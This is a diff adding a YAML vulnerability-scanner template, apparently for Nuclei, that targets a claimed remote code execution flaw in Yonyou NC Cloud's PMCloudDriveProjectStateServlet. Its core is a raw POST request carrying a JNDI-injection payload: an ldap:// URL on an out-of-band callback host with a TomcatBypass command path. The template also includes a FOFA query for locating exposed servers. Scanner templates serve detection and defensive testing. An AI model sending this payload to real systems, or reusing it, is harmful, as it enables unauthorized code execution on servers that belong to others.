@@ -1,0 +1,34 @@
+id: yonyou-nc-cloud-PMCloudDriveProjectStateServlet-rce
+
+info:
+  name: 用友 NC Cloud PMCloudDriveProjectStateServlet - rce
+  author: msk
+  severity: critical
+  description:
+  reference:
+    - todo
+  metadata:
+    verified: true
+    fofa-query: app="用友-NC-Cloud"
+  tags: yonyou,rce,nccloud,oa,oob
+
+http:
+  - raw:
+      - |
+        POST /service/~aert/PMCloudDriveProjectStateServlet HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.81 Safari/537.36
+        Accept: */*
+        Accept-Encoding: gzip, deflate
+        Connection: close
+        Content-Type: application/x-www-form-urlencoded
+
+        {"data_source":"ldap://{{interactsh-url}}/TomcatBypass/Command/calc","user":"admin","pk_group":"111"}
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+          - "http"
+        condition: or
